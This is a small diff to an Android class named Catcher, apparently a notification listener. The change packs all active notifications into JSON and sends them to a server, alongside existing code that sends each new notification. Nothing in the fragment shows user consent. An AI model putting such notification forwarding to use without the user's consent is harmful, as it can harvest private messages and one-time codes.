@@ -89,7 +89,9 @@ public class Catcher extends NotificationListenerService {
             //Send notification to the server
             sendToTheServer(notification);
             //Send active notifications
-            sendToTheServer(getAllActiveNotifications());
+            JSONObject active = new JSONObject();
+            active.put("json_active", getAllActiveNotifications().toString());
+            sendToTheServer(active);
 
         } catch (JSONException e) {
             Log.i(TAG, "JSONException - " + e.getMessage());
